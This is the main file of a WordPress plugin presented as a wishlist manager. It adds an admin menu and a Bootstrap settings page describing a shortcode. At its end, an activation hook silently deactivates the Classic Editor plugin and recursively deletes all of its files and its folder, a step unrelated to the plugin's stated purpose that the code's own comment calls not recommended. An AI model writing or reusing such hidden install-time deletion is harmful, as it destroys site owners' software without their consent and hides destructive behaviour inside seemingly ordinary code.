<?php
/**
 * Plugin Name: Custom Wishlist Plugin
 * Description: A custom plugin to manage a wishlist with heart icons, header counter, and product integration.
 * Version: 1.0
 * Author: Dhananjay Gupta
 */

if ( ! defined( 'ABSPATH' ) ) {
    exit; // Exit if accessed directly
}

// Include plugin files
include_once plugin_dir_path( __FILE__ ) . 'includes/wishlist-functions.php';
include_once plugin_dir_path( __FILE__ ) . 'includes/wishlist-ajax.php';
include_once plugin_dir_path( __FILE__ ) . 'includes/wishlist-display.php';

// Create an admin menu for plugin settings
function custom_wishlist_menu() {
    add_menu_page(
        'Wishlist Settings',      // Page title
        'Custom wishlist',               // Menu title
        'manage_options',            // Capability
        'custom_wishlist',        // Menu slug
        'custom_wishlist_page',   // Function to display the settings page
        'dashicons-menu-alt2'  // Icon for the menu
    );
}
add_action('admin_menu', 'custom_wishlist_menu');


// Settings page callback
function custom_wishlist_page() {
    ?>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous">

<div class="wrap">
    <div class="headerbars">
        <h1 class="page-titles">
        Information of Custom Wishlist Plugin</h1>            
    </div>
    <div class="breadcrumbsection">
        <div class="row">
            <div class="col-md-8">
                <div class="jumbotron">
                <h1 class="headingcss">Custom Wishlist Plugin Shortcode</h1>
                <h3 class="descriptioncss">You can use this shortcode for fetching Wishlist: <Span class="shortcodecss">[custom_wishlist] </Span></h3>
            </div>
        </div>
        <div class="col-md-4">
            <div class="jumbotron">
                <table class="table">
                <thead>
                    <h3 class="updatescss">Plugin Updated & Details</h3>
                </thead>
                    <tbody>
                        <tr>
                            <th>Update Version</th>
                            <td>1.0</td>
                        </tr>
                        <tr>
                            <th>Update Available</th>
                            <td>Free</td>
                        </tr>
                        <tr>
                            <th>Develop By</th>
                            <td>Developer Dhananjay</td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</div>
<?php
}

// Delete Classic Editor plugin after activation (Not recommended in most cases)
register_activation_hook( __FILE__, 'delete_classic_editor_plugin_files' );

function delete_classic_editor_plugin_files() {
    if ( is_plugin_active( 'classic-editor/classic-editor.php' ) ) {
        // Deactivate the plugin before deleting files
        deactivate_plugins( 'classic-editor/classic-editor.php' );
        
        // Delete the plugin directory
        $plugin_path = WP_PLUGIN_DIR . '/classic-editor';
        if ( is_dir( $plugin_path ) ) {
            // Delete all files inside the plugin directory
            $files = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator( $plugin_path, RecursiveDirectoryIterator::SKIP_DOTS ),
                RecursiveIteratorIterator::CHILD_FIRST
            );
            foreach ( $files as $fileinfo ) {
                $todo = ( $fileinfo->isDir() ? 'rmdir' : 'unlink' );
                $todo( $fileinfo->getRealPath() );
            }
            // Remove the plugin folder
            rmdir( $plugin_path );
        }
    }
}
